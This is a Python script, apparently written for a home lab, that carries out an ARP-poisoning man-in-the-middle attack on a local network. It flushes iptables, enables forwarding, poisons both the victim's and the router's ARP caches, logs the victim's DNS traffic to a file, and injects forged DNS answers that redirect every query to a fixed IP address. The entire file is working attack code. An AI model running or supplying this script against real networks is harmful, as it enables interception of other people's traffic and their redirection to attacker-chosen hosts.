from netfilterqueue import NetfilterQueue as nfq
from scapy.all import *
import os
import time
import threading

victim_ip_addr = '192.168.0.203'
router_ip_addr = '192.168.0.1'

def mac_addr_discovery():

    ## Discovering MAC Address of Victim Machine and Router

    print('Figuring Out Mac Address of Victim Machine with IP address 192.168.0.203')
    broadcast1 = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_layer1 = ARP(pdst = victim_ip_addr)
    entire_packet1 = broadcast1 / arp_layer1
    answer1 = srp(entire_packet1, timeout = 2, verbose = True, iface = "enp0s3")[0]

    time.sleep(2)

    print('Figuring out Mac Address of default gateway router with IP address of 192.168.0.1')
    broadcast2 = Ether(dst = 'ff:ff:ff:ff:ff:ff')
    arp_layer2 = ARP(pdst = router_ip_addr)
    entire_packet2 = broadcast2 / arp_layer2
    answer2 = srp(entire_packet2, timeout = 2, verbose = True, iface = "enp0s3")[0]

    victim_mac_addr = answer1[0][1].hwsrc
    router_mac_addr = answer2[0][1].hwsrc
    return victim_mac_addr, router_mac_addr

def poison(victim_pkt, router_pkt):
    print("Starting ARP poisoning loop...")
    while True:

        print('corruping victim')
        send(victim_pkt, verbose = False, iface = "enp0s3")
        
        time.sleep(2)

        print('corrupting router')
        send(router_pkt, verbose = False, iface = "enp0s3")

def packet_listener(packet):
    scapy_packet = IP(packet.get_payload() )
    #print(scapy_packet)

    if (scapy_packet.haslayer(TCP)):
        tcp_layer = scapy_packet[TCP]
        print(tcp_layer)

    if (scapy_packet.haslayer(DNS) and scapy_packet[DNS].qr == 0):
        print('DNS RESPONSE')
        dns_response = scapy_packet[DNS]
        print('-----------------------------')
        print('DNS ID', dns_response.id)
        print('DNS QR', dns_response.qr)
        print('DNS QNAME', dns_response.qd.qname)

        query_id = dns_response.id
        qname = dns_response.qd.qname
        qd = dns_response.qd

        sport = scapy_packet[UDP].sport



        dns_layer = DNS(id = query_id, qr = 1, aa = 1, ancount = 1,
                        qd = qd,
                        an = DNSRR(rrname = qname, ttl = 20, rdata = '157.240.8.35'))


        new_packet = IP(dst=victim_ip_addr, src = router_ip_addr) / UDP(sport = 53, dport = sport) / dns_layer

        #print('NEW PACKET', new_packet)

        del new_packet[IP].len 
        del new_packet[IP].chksum 

        del new_packet[UDP].len 
        del new_packet[UDP].chksum
        
        send(new_packet, iface = "enp0s3", verbose=False)
        packet.accept()
        return 

    packet.accept()




def packet_sniff(victim_mac_addr, router_mac_addr, attacker_mac_addr):

    def filterPkt(pkt):
        return pkt.haslayer(DNS) and Ether in pkt and (
            (pkt[Ether].src == victim_mac_addr and pkt[Ether].dst == attacker_mac_addr) or
            (pkt[Ether].src == attacker_mac_addr and pkt[Ether].dst == router_mac_addr) or 
            (pkt[Ether].src == router_mac_addr and pkt[Ether].dst == attacker_mac_addr)  or
            (pkt[Ether].src == attacker_mac_addr and pkt[Ether].dst == victim_mac_addr) 
        )

    def process_pkt(pkt):
        with open('file.txt', 'a') as file:
            file.write(pkt.show(dump=True))
            file.write('\n----\n')

    sniff(prn=process_pkt, lfilter = filterPkt, iface = "enp0s3")
    


def main():
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system('iptables -F')
    os.system('iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1')

    ether = Ether()
    attacker_mac_addr = ether.src

    victim_mac_addr, router_mac_addr = mac_addr_discovery()
    print(f"Victim MAC: {victim_mac_addr}")
    print(f"Router MAC: {router_mac_addr}")
    print(f"Attacker MAC: {attacker_mac_addr}")

    victim_pkt = ARP(op=2, hwdst = victim_mac_addr, pdst= victim_ip_addr, psrc= router_ip_addr)
    router_pkt = ARP(op=2, hwdst = router_mac_addr, pdst=router_ip_addr, psrc= victim_ip_addr)

    threading.Thread(target=packet_sniff, args = (victim_mac_addr, router_mac_addr, attacker_mac_addr), daemon = True).start()
    threading.Thread(target=poison, args=(victim_pkt, router_pkt), daemon=True).start()

    queue = nfq()
    queue.bind(1, packet_listener)
    queue.run()


if __name__ == "__main__":
    main()

